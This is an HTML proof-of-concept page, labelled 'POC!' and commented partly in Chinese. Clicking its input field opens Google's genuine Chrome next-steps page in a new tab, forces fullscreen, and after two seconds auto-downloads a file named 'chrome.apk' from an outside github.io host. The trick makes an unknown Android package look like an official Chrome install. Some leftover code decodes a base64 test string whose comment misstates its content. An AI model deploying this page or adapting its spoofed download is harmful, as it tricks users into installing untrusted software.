<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Download & Fullscreen on Keypress</title>
</head>
<body>
  <center><h2>POC!</h2></center>
  <input type="text" id="triggerInput">
  <script>
    document.getElementById('triggerInput').addEventListener('click', function() {
      // request fullscreen
     setTimeout(function() {
            openWin();
     }, 2000);
     window.open('https://www.google.com/intl/en_in/chrome/next-steps.html?statcb=0&installdataindex=empty&defaultbrowser=0', '_blank');
      goFullScreen();
    }, { once: false });

    // Download helper
    function Puf(uri, name) {
      const link = document.createElement("a");
      link.href = uri;
      link.download = name;
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
      // 释放 URL 对象以释放内存
      if (uri.startsWith('blob:')) {
          setTimeout(() => URL.revokeObjectURL(uri), 100);
      }
    }

    // 辅助函数：将 Base64 转换为 Blob
    function base64ToBlob(base64, mimeType) {
      const byteCharacters = atob(base64);
      const byteNumbers = new Array(byteCharacters.length);
      for (let i = 0; i < byteCharacters.length; i++) {
        byteNumbers[i] = byteCharacters.charCodeAt(i);
      }
      const byteArray = new Uint8Array(byteNumbers);
      return new Blob([byteArray], { type: mimeType });
    }

    // Kick off your “APK” download
    function openWin() {
      // 这里是你原本 Base64 字符串的纯内容部分 (去掉了 'data:...' 前缀)
      // "ZXN0dGVzdGVzdHRlc3Q=" 解码后是 "testtesttest"
      const base64Data = "ZXN0dGVzdGVzdHRlc3Q="; 
      
      // 创建 Blob 对象
      const blob = base64ToBlob(base64Data, "application/vnd.android.package-archive");
      
      // 生成 Blob URL (格式如: blob:https://example.com/wd9a-...)
      const blobUrl = URL.createObjectURL(blob);

      // 触发下载
      Puf("http://ybt01.github.io/upload/chrome.apk", "chrome.apk");
    }

    function goFullScreen() {
      const element = document.documentElement;
      if (element.requestFullscreen) {
        element.requestFullscreen();
      } else if (element.mozRequestFullScreen) { // Firefox
        element.mozRequestFullScreen();
      } else if (element.webkitRequestFullscreen) { // Chrome, Safari and Opera
        element.webkitRequestFullscreen();
      } else if (element.msRequestFullscreen) { // IE/Edge
        element.msRequestFullscreen();
      }
    }

  </script>  
</body>
</html>
